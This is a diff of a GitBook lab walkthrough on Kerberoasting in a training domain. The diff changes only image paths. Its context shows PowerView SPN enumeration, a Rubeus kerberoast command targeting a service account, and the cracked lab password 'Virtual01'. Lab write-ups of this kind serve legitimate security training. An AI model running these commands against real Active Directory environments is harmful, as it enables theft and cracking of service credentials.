@@ -250,7 +250,7 @@ We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 enc
 Get-DomainUser * -spn | select samaccountname, serviceprincipalname
 ```
 
-<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption><p>svc_vmwaresso:vmware/inlanefreight.local</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption><p>svc_vmwaresso:vmware/inlanefreight.local</p></figcaption></figure>
 
 **Crack the password for this account and submit it as your answer.**
 
@@ -258,7 +258,7 @@ Get-DomainUser * -spn | select samaccountname, serviceprincipalname
 .\Rubeus.exe kerberoast /nowrap /user:svc_vmwaresso
 ```
 
-<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption><p>Virtual01</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption><p>Virtual01</p></figcaption></figure>
 
